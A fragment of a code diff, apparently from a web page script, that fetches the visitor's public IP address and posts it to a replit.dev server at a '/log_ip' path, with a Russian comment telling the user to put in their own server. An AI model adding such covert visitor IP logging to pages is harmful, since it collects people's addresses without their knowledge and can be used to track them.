@@ -148,7 +148,7 @@
     fetch("https://api64.ipify.org?format=json")
       .then(response => response.json())
       .then(data => {
-        fetch("https://671f67c3-578c-4f94-9ab5-0af236ba82f3-00-wf5gx1mmb88r.spock.replit.dev/", {  // Укажи свой сервер
+fetch("https://671f67c3-578c-4f94-9ab5-0af236ba82f3-00-wf5gx1mmb88r.spock.replit.dev/log_ip", {  // Укажи свой сервер
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
